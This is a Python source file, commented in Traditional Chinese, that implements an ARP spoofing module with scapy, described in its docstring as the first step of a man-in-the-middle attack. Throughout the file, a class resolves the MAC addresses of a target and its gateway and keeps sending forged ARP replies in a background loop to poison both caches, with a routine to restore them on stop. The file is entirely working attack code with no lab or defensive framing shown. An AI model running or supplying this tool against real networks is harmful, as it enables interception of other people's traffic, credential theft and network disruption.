#!/usr/bin/env python3
"""
ARP欺騙攻擊模組
實現中間人攻擊的第一步：ARP欺騙
"""

import time
import sys
from scapy.all import ARP, send, get_if_hwaddr, get_if_addr, get_if_list
import threading

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface=None):
        """
        初始化ARP欺騙器
        
        Args:
            target_ip: 目標IP位址
            gateway_ip: 閘道IP位址
            interface: 網路介面
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.spoofing = False
        self.spoof_thread = None
        
        # 如果沒有指定介面，獲取預設介面
        if not self.interface:
            self.interface = self._get_default_interface()
        
        # 獲取本機MAC位址
        try:
            self.attacker_mac = get_if_hwaddr(self.interface)
        except Exception as e:
            print(f"警告: 無法獲取介面 {self.interface} 的MAC位址: {e}")
            # 嘗試使用第一個可用介面
            interfaces = get_if_list()
            if interfaces:
                self.interface = interfaces[0]
                self.attacker_mac = get_if_hwaddr(self.interface)
            else:
                raise Exception("無法找到可用的網路介面")
    
    def _get_default_interface(self):
        """獲取預設網路介面"""
        try:
            # 獲取所有介面
            interfaces = get_if_list()
            # 過濾掉回環介面
            non_loopback = [iface for iface in interfaces if not iface.startswith('lo')]
            if non_loopback:
                return non_loopback[0]
            # 如果沒有非回環介面，返回第一個介面
            if interfaces:
                return interfaces[0]
            # 預設使用 eth0
            return 'eth0'
        except:
            return 'eth0'
    
    def get_mac(self, ip):
        """獲取指定IP的MAC位址"""
        from scapy.all import Ether, srp
        
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    
    def spoof(self, target_ip, spoof_ip):
        """發送ARP欺騙資料包"""
        target_mac = self.get_mac(target_ip)
        if target_mac:
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                        psrc=spoof_ip)
            send(packet, verbose=False, iface=self.interface)
    
    def restore(self, destination_ip, source_ip):
        """恢復ARP表"""
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        
        if destination_mac and source_mac:
            packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                        psrc=source_ip, hwsrc=source_mac)
            send(packet, count=4, verbose=False, iface=self.interface)
    
    def _spoof_loop(self):
        """ARP欺騙迴圈"""
        while self.spoofing:
            # 欺騙目標：告訴目標我們的MAC是閘道的MAC
            self.spoof(self.target_ip, self.gateway_ip)
            # 欺騙閘道：告訴閘道我們的MAC是目標的MAC
            self.spoof(self.gateway_ip, self.target_ip)
            time.sleep(2)
    
    def start(self):
        """開始ARP欺騙"""
        if self.spoofing:
            return False
        
        self.spoofing = True
        self.spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.spoof_thread.start()
        print(f"[+] ARP欺騙已啟動: {self.target_ip} <-> {self.gateway_ip}")
        return True
    
    def stop(self):
        """停止ARP欺騙並恢復ARP表"""
        if not self.spoofing:
            return False
        
        self.spoofing = False
        if self.spoof_thread:
            self.spoof_thread.join(timeout=3)
        
        print("[+] 正在恢復ARP表...")
        self.restore(self.target_ip, self.gateway_ip)
        self.restore(self.gateway_ip, self.target_ip)
        print("[+] ARP表已恢復")
        return True


